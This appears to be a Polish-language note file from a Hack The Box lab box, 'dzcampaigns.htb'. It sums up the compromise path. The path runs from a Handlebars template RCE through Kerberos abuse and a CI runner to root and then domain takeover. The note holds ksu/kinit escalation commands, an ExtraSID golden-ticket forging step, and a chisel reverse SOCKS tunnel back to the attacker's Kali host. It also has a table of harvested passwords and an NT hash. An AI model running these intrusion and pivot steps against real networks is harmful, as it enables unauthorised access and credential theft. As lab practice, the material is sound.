# ACCESS — dzcampaigns.htb

## VPN

- **Release Arena EU:** `~/Desktop/release_arena_eu-release-1.ovpn`  
- IP: sprawdź HTB (w sesji m.in. `10.129.50.138`)  
- hosts: `dzcampaigns.htb` → IP boxa  

```bash
ip -br a | grep tun
```

## User

```bash
ssh -i ~/.ssh/dz_svc svc-runner@<IP>
cat ~/user.txt
```

## Path summary

1. RCE darkzero — Handlebars AST (`campaign_message` JSON object) — CVE-2026-33937  
2. josh / **Rangers1** (web hash = AD EXT)  
3. `kinit josh@DARKZERO.EXT` + Gitea **SPNEGO** (`darkzero-ext_josh`)  
4. PR + review-comment workflow `runs-on: ubuntu` → **svc-runner**  
5. SSH key / user flag  

## Root SRV01 (Linux — bez root.txt)

```bash
# svc-runner: AD user root w OU=GiteaMigration + unicodePwd (jednorazowo)
echo 'Rangers1!Abc' | kinit -c FILE:/tmp/root.ccache root@DARKZERO.EXT
KRB5CCNAME=FILE:/tmp/root.ccache ksu root -n root@DARKZERO.EXT -c FILE:/tmp/root.ccache
# interactive uid=0
```

Loot: `/root/darkzero_campaigns_backup.sql` — **system flag nie tu**.

## DA EXT

```text
celia@DARKZERO.EXT / babygurl13
```

## System (DC01 HTB)

ExtraSID BO `S-1-5-32-551` na golden EXT → CIFS DC01 + backup intent:

```bash
python3 scripts/forge_bo_extrasid.py ...
# SRV01: kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
python3 scripts/smb_bo_get.py --path 'Users\\Administrator\\Desktop\\root.txt' --out root.txt
```

```text
```

## Pivot

```bash
# chisel: server na Kali :8000 --reverse --socks5 → 127.0.0.1:1080
# client na SRV01: chisel client <KALI_IP>:8000 R:socks
# proxychains: scripts/pc-chisel.conf
```

## Creds (skrót)

| Konto | Secret |
|-------|--------|
| josh | Rangers1 |
| celia | babygurl13 |
| AD root (ksu) | Rangers1!Abc |
| svc-gitea | SMvUAmVFTY7! |
| DC02 Admin local NT | 6a2bdd03aa4dc9ff2c4f19860e380618 |

Szczegóły → **WRITEUP.md**, `loot/copy-paste.txt`.
